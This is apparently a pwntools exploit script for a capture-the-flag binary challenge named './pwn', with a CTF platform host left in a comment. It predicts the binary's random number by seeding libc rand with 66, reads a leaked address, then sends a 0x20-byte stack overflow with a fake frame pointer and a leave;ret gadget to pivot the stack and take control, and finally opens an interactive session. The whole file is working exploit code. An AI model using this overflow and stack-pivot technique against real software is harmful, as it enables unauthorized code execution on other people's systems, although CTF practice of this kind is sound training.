from pwn import * 
from pwn import p64
import socket
from ctypes import *
# log_level = 'debug'
context(arch='amd64',os = 'linux', log_level='DEBUG')
context.terminal = ['tmux', 'splitw', '-h']

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,34363)#远程连接
elf = cdll.LoadLibrary('libc.so.6')
r = process("./pwn")
elf.srand(66)

r.sendlineafter(b'input a num:\n',str(elf.rand()))
print(r.recvline())
gift_addr = r.recvline()
gift_addr = int(gift_addr[5:-1], 16)

leave_ret_addr = 0x4012D6

gdb.attach(r, 'b *0x4012BA')
pause()
r.send(b'A'*0x20 + p64(gift_addr-4) + p64(leave_ret_addr))
r.interactive()




